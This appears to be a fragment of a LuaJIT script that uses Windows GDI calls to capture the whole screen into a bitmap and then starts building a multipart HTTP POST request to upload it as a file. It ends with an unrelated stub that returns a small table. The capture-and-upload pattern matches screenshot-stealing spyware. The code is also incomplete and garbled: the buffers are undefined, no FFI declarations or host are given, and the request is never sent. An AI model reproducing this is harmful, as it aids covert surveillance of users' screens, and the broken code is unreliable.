local ffi = require("ffi")
local gdi32 = ffi.load("gdi32")
local user32 = ffi.load("user32")
local w = user32.GetSystemMetrics(0)
local h = user32.GetSystemMetrics(1)
local hdc = user32.GetDC(nil)
local mem = gdi32.CreateCompatibleDC(hdc)
local bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
gdi32.SelectObject(mem, bmp)
gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
gdi32.GetDIBits(mem, bmp, 0, h, buf, bmi, 0)
local boundary = "----formboundary7MA4YWxk"
local body = "--" .. boundary .. "\\r\\nContent-Disposition: form-data; name=\"file\"\\r\\n\\r\\n"
local req = "POST / HTTP/1.1\\r\\nContent-Type: multipart/form-data; boundary=" .. boundary
local T = {"a","b","c"}
return T
